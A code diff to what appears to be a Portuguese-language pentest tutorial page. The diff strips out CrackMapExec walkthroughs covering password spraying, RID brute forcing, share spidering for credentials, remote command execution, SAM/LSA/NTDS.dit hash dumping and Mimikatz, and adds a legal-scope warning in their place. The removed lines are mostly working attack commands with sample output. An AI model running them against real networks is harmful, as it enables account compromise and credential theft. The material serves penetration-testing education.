-# [-] EMPRESA\\admin:P@ssw0rd! STATUS_ACCOUNT_DISABLED → conta desabilitada
-# [-] EMPRESA\\admin:P@ssw0rd! STATUS_PASSWORD_EXPIRED → senha expirada`}
-      />
-
-      <h2>Password Spraying</h2>
-      <CodeBlock
-        title="Testar senhas comuns contra muitos usuários"
-        code={`# ═══════════════════════════════════════════════════
-# O QUE É PASSWORD SPRAYING
-# ═══════════════════════════════════════════════════
-# Em vez de testar MUITAS senhas contra UM usuário (bruteforce),
-# spray testa UMA senha contra MUITOS usuários.
-# → Evita lockout de conta (geralmente 3-5 tentativas)!
-
-# ═══════════════════════════════════════════════════
-# PASSO 1: Obter lista de usuários
-# ═══════════════════════════════════════════════════
-# Via LDAP (se tiver qualquer credencial):
-crackmapexec ldap dc01.empresa.local -u user -p 'senha' --users
-# Lista TODOS os usuários do domínio com detalhes
-
-# Via SMB (enumerar sem credencial — nem sempre funciona):
-crackmapexec smb dc01.empresa.local --users
-# Pode funcionar se RID cycling estiver habilitado
-
-# Via RID bruteforce:
-crackmapexec smb dc01.empresa.local -u '' -p '' --rid-brute 5000
-# --rid-brute 5000 = testar RIDs de 500 a 5000
-# RID 500 = Administrator (sempre existe!)
-# RID 501 = Guest
-# RID 1001+ = usuários normais
-
-# ═══════════════════════════════════════════════════
-# PASSO 2: Password Spray
-# ═══════════════════════════════════════════════════
-# Uma senha contra todos os usuários:
-crackmapexec smb dc01.empresa.local \\
-  -u users.txt \\
-  -p 'Empresa2024!'
-# users.txt = lista com um usuário por linha
-# Testa "Empresa2024!" em CADA usuário
-
-# Múltiplas senhas (cuidado com lockout!):
-crackmapexec smb dc01.empresa.local \\
-  -u users.txt \\
-  -p passwords.txt \\
-  --no-bruteforce
-# --no-bruteforce = testa user1:pass1, user2:pass2 (pareado)
-# SEM --no-bruteforce = testa TODAS combinações (perigoso!)
-
-# Senhas comuns para spray:
-# Empresa2024!
-# Empresa@2024
-# Welcome1
-# Winter2024!
-# Summer2024!
-# P@ssw0rd
-# Senha123
-# [NomeEmpresa][Ano]!
-
-# ═══════════════════════════════════════════════════
-# PASSO 3: Continuar após encontrar credencial
-# ═══════════════════════════════════════════════════
-# Se spray encontrar [+] EMPRESA\\joao:Empresa2024!
-# Usar essa credencial para enumerar MAIS:
-crackmapexec smb 192.168.1.0/24 -u joao -p 'Empresa2024!'
-# Ver em quantos hosts o joão tem admin local`}
-      />
-
-      <h2>Enumeração de Rede e AD</h2>
-      <CodeBlock
-        title="Enumerar shares, usuários, grupos e políticas"
-        code={`# ═══════════════════════════════════════════════════
-# ENUMERAR COMPARTILHAMENTOS (SMB SHARES)
-# ═══════════════════════════════════════════════════
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' --shares
-# Output:
-# Share      Permissions  Remark
-# -----      -----------  ------
-# ADMIN$     READ,WRITE   Remote Admin    ← Share admin (C:\\Windows)
-# C$         READ,WRITE   Default share   ← Raiz do C:
-# IPC$       READ         Remote IPC
-# NETLOGON   READ         Logon server share
-# SYSVOL     READ         Logon server share
-# Backup     READ         ← Compartilhamento customizado!
-# Financeiro READ,WRITE   ← Dados sensíveis?
-
-# Pesquisar DENTRO dos shares:
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' \\
-  --spider Backup --regex "password|senha|credential|config"
-# --spider = navegar recursivamente o share
-# --regex = filtrar por padrão
-# Encontra arquivos como: credenciais.txt, .env, config.xml
-
-# ═══════════════════════════════════════════════════
-# ENUMERAR ACTIVE DIRECTORY VIA LDAP
-# ═══════════════════════════════════════════════════
-# Listar usuários do domínio:
-crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' --users
-
-# Listar grupos:
-crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' --groups
-
-# Encontrar Domain Admins:
-crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' \\
-  --groups "Domain Admins"
-
-# Listar computadores do domínio:
-crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' --computers
-
-# Obter política de senha (para calibrar spray):
-crackmapexec smb dc01.empresa.local -u admin -p 'P@ssw0rd!' --pass-pol
-# Output:
-# Minimum password length: 8
-# Password history length: 24
-# Maximum password age: 42 days
-# Account lockout threshold: 5      ← IMPORTANTE!
-# Account lockout duration: 30 min
-# ↑ Após 5 tentativas erradas → conta bloqueada por 30 min
-# → No spray, testar no máximo 2-3 senhas por ciclo!
-
-# ═══════════════════════════════════════════════════
-# ENCONTRAR CONTAS COM DADOS SENSÍVEIS
-# ═══════════════════════════════════════════════════
-# Contas com "senha nunca expira":
-crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' \\
-  --trusted-for-delegation
-# Contas com delegação → potencial para Kerberos attacks!
-
-# Descrições de usuários (podem conter senhas!):
-crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' \\
-  --users | grep -i "pass\\|senha\\|pwd"`}
-      />
-
-      <h2>Execução Remota e Dump de Credenciais</h2>
-      <CodeBlock
-        title="Executar comandos e extrair hashes"
-        code={`# ═══════════════════════════════════════════════════
-# EXECUTAR COMANDOS REMOTAMENTE
-# ═══════════════════════════════════════════════════
-# REQUER admin local (Pwn3d!)
-
-# Via SMB (execução com cmd.exe):
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' -x 'whoami'
-# -x = executar comando via cmd.exe
-# Output: empresa\\admin
-
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' -x 'ipconfig /all'
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' -x 'net user /domain'
-
-# Via PowerShell (-X maiúsculo):
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' -X 'Get-Process'
-# -X = executar via PowerShell (mais poderoso que cmd)
-
-# Via WinRM (PowerShell remoting — mais limpo):
-crackmapexec winrm 192.168.1.100 -u admin -p 'P@ssw0rd!' -x 'whoami'
-
-# Executar em TODOS os hosts da rede:
-crackmapexec smb 192.168.1.0/24 -u admin -p 'P@ssw0rd!' -x 'hostname'
-# Executa "hostname" em cada host onde admin tem acesso!
-
-# ═══════════════════════════════════════════════════
-# DUMP DE SAM (hashes locais)
-# ═══════════════════════════════════════════════════
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' --sam
-# --sam = dump do banco SAM (Security Account Manager)
-# SAM contém hashes de TODOS os usuários LOCAIS do host
-# Output:
-# Administrator:500:aad3...:32ed87bdb5fdc5e9cba88547376818d4:::
-# DefaultAccount:503:aad3...:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# ↑ username:RID:LM_hash:NT_hash
-# O NT_hash pode ser usado para Pass-the-Hash!
-
-# ═══════════════════════════════════════════════════
-# DUMP DE LSA SECRETS
-# ═══════════════════════════════════════════════════
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' --lsa
-# --lsa = dump dos LSA Secrets
-# LSA pode conter:
-# - Senhas de contas de serviço em texto claro!
-# - Senhas de auto-logon
-# - Credenciais de VPN
-# - Chaves de criptografia
-
-# ═══════════════════════════════════════════════════
-# DUMP DE NTDS.DIT (TODOS os hashes do domínio!)
-# ═══════════════════════════════════════════════════
-# REQUER admin no Domain Controller!
-crackmapexec smb dc01.empresa.local -u domainadmin -p 'P@ssw0rd!' --ntds
-# --ntds = dump do NTDS.dit (banco do Active Directory)
-# Contém hash de TODOS os usuários do domínio!
-# Output: MILHARES de linhas:
-# EMPRESA\\Administrator:500:aad3...:hash_nt:::
-# EMPRESA\\joao:1001:aad3...:hash_nt:::
-# EMPRESA\\maria:1002:aad3...:hash_nt:::
-# ...
-# Com esses hashes, pode fazer Pass-the-Hash em qualquer conta!
-
-# Filtrar apenas Domain Admins:
-crackmapexec smb dc01.empresa.local -u domainadmin -p 'P@ssw0rd!' \\
-  --ntds --user Administrator
-# --user = filtrar por usuário específico
-
-# ═══════════════════════════════════════════════════
-# MIMIKATZ VIA CME
-# ═══════════════════════════════════════════════════
-# Executar Mimikatz remotamente:
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' \\
-  -M mimikatz
-# Módulo que injeta Mimikatz e extrai credenciais
-# Pode retornar senhas em TEXTO CLARO da memória!`}
-      />
+      <AlertBox type="danger" title="Sempre dentro do escopo">
+        Spray, RID brute e dump de NTDS são técnicas que CAEM dentro de "intrusão não autorizada"
+        no Brasil (Lei 12.737/12). Sem RoE escrito, são crime. Em red team com escopo, documente
+        cada hash dumpado e saneie o relatório (não inclua hashes reais — substitua por sanitized).
+      </AlertBox>
     </PageContainer>
   );
 }
